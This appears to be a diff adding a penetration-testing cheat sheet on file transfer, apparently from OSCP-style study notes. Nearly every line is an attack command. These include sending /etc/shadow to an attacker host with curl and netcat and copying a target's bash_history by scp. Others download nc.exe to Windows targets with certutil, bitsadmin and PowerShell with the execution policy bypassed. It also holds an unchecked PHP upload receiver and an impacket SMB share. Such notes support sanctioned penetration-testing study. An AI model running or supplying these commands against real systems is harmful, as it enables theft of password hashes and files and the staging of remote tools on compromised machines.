@@ -1,0 +1,54 @@
+### file transfer ##
+
+
+# python
+python3 -m http.server 8000
+wget http://$h:8000/shadow
+curl http://$h:8000/shadow -o shadow
+
+# php
+curl --form "uploadedfile=@/etc/shadow" http://192.168.48.3/upload.php		# upload.php on attacker server
+
+# nc
+nc -lvnp 4444 > copiedNetcatShadow.txt						# attacker
+./nc 192.168.48.3 4444 < /etc/shadow						# target
+
+# scp
+scp offsec@192.168.50.151:/home/offsec/.bash_history offsecHistory.txt		# from target to attacker
+
+# certutil
+certutil -urlcache -split -f http://192.168.48.3/nc.exe nc.exe
+
+# bitsadmin
+bitsadmin /create MyDownload							# create a job
+bitsadmin /addfile MyDownload http://192.168.48.3/nc.exe C:\tmp\nc.exe		# add file to the job
+bitsadmin /resume MyDownload							# run the job
+bitsadmin /info MyDownload /verbose						# check the status
+bitsadmin /complete MyDownload							# finish the job
+
+# powershell
+Invoke-WebRequest -URI http://ip/nc.exe -OutFile nc.exe
+wget http://ip/nc.exe -o nc.exe
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://ip/nc.exe', 'nc.exe')
+# exec some powershell script file
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File .\wget.ps1
+
+# powershell trought php
+$ cat uploadWin.php
+<?php 
+$uploaddir = '/var/www/html/uploads/';
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+
+powershell (New-Object System.Net.WebClient).UploadFile('http://ip/uploadWin.php', '.\Sec.jpg')
+
+# SMB
+mkdir smb && cd smb
+impacket-smbserver share . -smb2support
+net view \\IP
+copy file_name \\IP\share
+
+
+
+
+
